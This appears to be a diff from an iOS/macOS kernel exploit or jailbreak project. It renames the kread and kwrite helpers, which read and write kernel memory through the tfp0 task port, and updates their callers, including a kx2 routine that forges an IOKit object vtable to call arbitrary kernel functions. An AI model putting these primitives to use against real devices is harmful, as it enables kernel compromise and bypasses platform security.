@@ -520,7 +520,7 @@ kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t add
 kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
 
 size_t
-kread(uint64_t where, void *p, size_t size)
+extra_kread(uint64_t where, void *p, size_t size)
 {
     
     if(tfp0 == MACH_PORT_NULL) {
@@ -549,7 +549,7 @@ uint64_t
 kread_uint64(uint64_t where)
 {
     uint64_t value = 0;
-    size_t sz = kread(where, &value, sizeof(value));
+    size_t sz = extra_kread(where, &value, sizeof(value));
     return (sz == sizeof(value)) ? value : 0;
 }
 
@@ -557,12 +557,12 @@ uint32_t
 kread_uint32(uint64_t where)
 {
     uint32_t value = 0;
-    size_t sz = kread(where, &value, sizeof(value));
+    size_t sz = extra_kread(where, &value, sizeof(value));
     return (sz == sizeof(value)) ? value : 0;
 }
 
 size_t
-kwrite(uint64_t where, const void *p, size_t size)
+extra_kwrite(uint64_t where, const void *p, size_t size)
 {
     
     if(tfp0 == MACH_PORT_NULL) {
@@ -589,13 +589,13 @@ kwrite(uint64_t where, const void *p, size_t size)
 size_t
 kwrite_uint64(uint64_t where, uint64_t value)
 {
-    return kwrite(where, &value, sizeof(value));
+    return extra_kwrite(where, &value, sizeof(value));
 }
 
 size_t
 kwrite_uint32(uint64_t where, uint32_t value)
 {
-    return kwrite(where, &value, sizeof(value));
+    return extra_kwrite(where, &value, sizeof(value));
 }
 
 void kx2(uint64_t fptr, uint64_t arg1, uint64_t arg2) {
@@ -610,12 +610,12 @@ void kx2(uint64_t fptr, uint64_t arg1, uint64_t arg2) {
     r_obj[7] = 0x0;                     //
     r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
     
-    kwrite(kernel_buffer_base, r_obj, sizeof(r_obj));
+    extra_kwrite(kernel_buffer_base, r_obj, sizeof(r_obj));
     
     io_service_t service = MACH_PORT_NULL;
     IOConnectGetService(target_uc, &service);
     
-    kwrite(kernel_buffer_base, legit_object, sizeof(r_obj));
+    extra_kwrite(kernel_buffer_base, legit_object, sizeof(r_obj));
 }
 
 
